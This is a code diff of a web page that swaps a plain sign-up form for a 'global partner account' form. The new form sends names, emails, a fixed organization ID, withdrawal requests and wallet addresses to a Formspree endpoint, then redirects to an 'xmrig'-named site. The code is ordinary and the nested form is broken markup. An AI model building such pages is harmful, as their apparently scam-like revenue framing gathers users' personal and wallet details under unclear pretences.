@@ -83,20 +83,106 @@
                 </div>
                 <form id="signUpActionForm" class="space-y-4">
                     <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1">Full Name</label>
-                        <input type="text" placeholder="John Doe" required class="w-full bg-[#080F21] border border-slate-700 rounded p-2.5 text-sm text-white focus:outline-none focus:border-emerald-500">
-                    </div>
-                    <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1">Email Address</label>
-                        <input type="email" id="signUpEmail" placeholder="name@domain.com" required class="w-full bg-[#080F21] border border-slate-700 rounded p-2.5 text-sm text-white focus:outline-none focus:border-emerald-500">
-                    </div>
-                    <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1">Preferred Partner/Organization ID</label>
-                        <input type="text" placeholder="e.g. 1127062983" class="w-full bg-[#080F21] border border-slate-700 rounded p-2.5 text-sm text-white focus:outline-none focus:border-emerald-500">
-                    </div>
-                    <button type="submit" class="w-full custom-gradient-btn text-white font-bold py-2.5 px-4 rounded text-sm transition uppercase tracking-wider mt-2">
-                        Submit Application
-                    </button>
+                        <!-- SYSTEM CONTROL OFFICE / DATA INTEGRATION FORMS -->
+<div id="mesxent-console-container" style="padding: 20px; background: #0b0f17; border-radius: 8px; border: 1px solid #1f2937; margin: 15px auto; max-width: 450px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
+    
+    <div style="text-align: center; margin-bottom: 20px;">
+        <h3 style="color: #00ffcc; margin: 0 0 5px 0; font-size: 1.2rem; letter-spacing: 1px;">CREATE GLOBAL PARTNER ACCOUNT</h3>
+        <p style="color: #9ca3af; margin: 0; font-size: 0.85rem;">Register your decentralized node to tap into product marketing and agro-infrastructure campaigns.</p>
+    </div>
+
+    <!-- ADDED ID FOR JAVASCRIPT HANDLING -->
+    <form id="agro-revenue-form" action="https://formspree.io/f/xaqznnqe" method="POST" style="display: flex; flex-direction: column; gap: 15px;">
+        
+        <!-- FULL NAME INPUT -->
+        <div>
+            <label style="color: #e5e7eb; display: block; margin-bottom: 6px; font-size: 0.8rem; font-weight: bold; letter-spacing: 0.5px;">FULL NAME</label>
+            <input type="text" name="name" placeholder="John Doe" required style="width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #374151; background: #111827; color: #ffffff; font-size: 0.95rem; box-sizing: border-box;">
+        </div>
+
+        <!-- EMAIL ADDRESS INPUT -->
+        <div>
+            <label style="color: #e5e7eb; display: block; margin-bottom: 6px; font-size: 0.8rem; font-weight: bold; letter-spacing: 0.5px;">EMAIL ADDRESS</label>
+            <input type="email" name="email" placeholder="name@domain.com" required style="width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #374151; background: #111827; color: #ffffff; font-size: 0.95rem; box-sizing: border-box;">
+        </div>
+
+        <!-- FIXED CORE ID -->
+        <div>
+            <label style="color: #e5e7eb; display: block; margin-bottom: 6px; font-size: 0.8rem; font-weight: bold; letter-spacing: 0.5px;">PREFERRED PARTNER/ORGANIZATION ID</label>
+            <input type="text" name="organization_id" value="11270629836102" readonly style="width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #374151; background: #1f2937; color: #9ca3af; font-size: 0.95rem; font-weight: bold; box-sizing: border-box;">
+        </div>
+
+        <!-- REQUEST TYPE CHANGER -->
+        <div>
+            <label style="color: #e5e7eb; display: block; margin-bottom: 6px; font-size: 0.8rem; font-weight: bold; letter-spacing: 0.5px;">REQUEST TYPE / INQUIRY</label>
+            <select name="request_type" style="width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #374151; background: #111827; color: #ffffff; font-size: 0.95rem; box-sizing: border-box; cursor: pointer;">
+                <option value="New Partner Sign Up">New Trainee Sign Up / Account Activation</option>
+                <option value="Revenue Withdrawal Request">Revenue Withdrawal Request</option>
+                <option value="General System Inquiry">System Inquiry / Support Complaint</option>
+            </select>
+        </div>
+
+        <!-- MESSAGE / COMPLAINT TEXT BOX -->
+        <div>
+            <label style="color: #e5e7eb; display: block; margin-bottom: 6px; font-size: 0.8rem; font-weight: bold; letter-spacing: 0.5px;">ADDITIONAL DETAILS / COMPLAINTS</label>
+            <textarea name="message" rows="3" placeholder="Enter details about your inquiry, wallet addresses, or feedback here..." style="width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #374151; background: #111827; color: #ffffff; font-size: 0.95rem; box-sizing: border-box; resize: vertical; font-family: inherit;"></textarea>
+        </div>
+
+        <!-- STATUS FEEDBACK MESSAGE -->
+        <div id="form-status" style="display: none; text-align: center; font-size: 0.9rem; font-weight: bold; padding: 5px;"></div>
+
+        <!-- SUBMIT TRIGGER BUTTON -->
+        <button type="submit" id="submit-btn" style="width: 100%; padding: 14px; background: #00ffcc; color: #0b0f17; border: none; border-radius: 6px; font-weight: bold; font-size: 1rem; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 5px; transition: background 0.2s ease;">
+            SUBMIT TO MANAGEMENT
+        </button>
+    </form>
+</div>
+
+<!-- FREE REDIRECT BYPASS SCRIPT -->
+<script>
+    document.getElementById("agro-revenue-form").addEventListener("submit", function(e) {
+        e.preventDefault(); // Stop normal Formspree page reload
+        
+        var form = this;
+        var btn = document.getElementById("submit-btn");
+        var status = document.getElementById("form-status");
+        
+        btn.disabled = true;
+        btn.innerText = "PROCESSING...";
+        btn.style.background = "#4b5563";
+
+        // Send data securely via AJAX background request
+        fetch(form.action, {
+            method: form.method,
+            body: new FormData(form),
+            headers: { 'Accept': 'application/json' }
+        }).then(response => {
+            if (response.ok) {
+                status.style.display = "block";
+                status.style.color = "#00ffcc";
+                status.style.background = "rgba(0, 255, 204, 0.1)";
+                status.style.borderRadius = "4px";
+                status.innerHTML = "✓ Request Submitted! Returning to Dashboard...";
+                
+                form.reset();
+                
+                // Forces your app view to seamlessly refresh back to your core home screen layout after 2.5 seconds
+                setTimeout(function() {
+                    window.location.href = "https://xmrig-lac.vercel.app/";
+                }, 2500);
+            } else {
+                throw new Error('Submission failed');
+            }
+        }).catch(error => {
+            btn.disabled = false;
+            btn.innerText = "SUBMIT TO MANAGEMENT";
+            btn.style.background = "#00ffcc";
+            status.style.display = "block";
+            status.style.color = "#ef4444";
+            status.innerHTML = "✕ Error sending request. Please try again.";
+        });
+    });
+</script>
                 </form>
                 <div class="text-center mt-4">
                     <button id="toLoginBtn" class="text-xs text-slate-400 hover:text-emerald-400 transition underline">Already verified? Log in here</button>
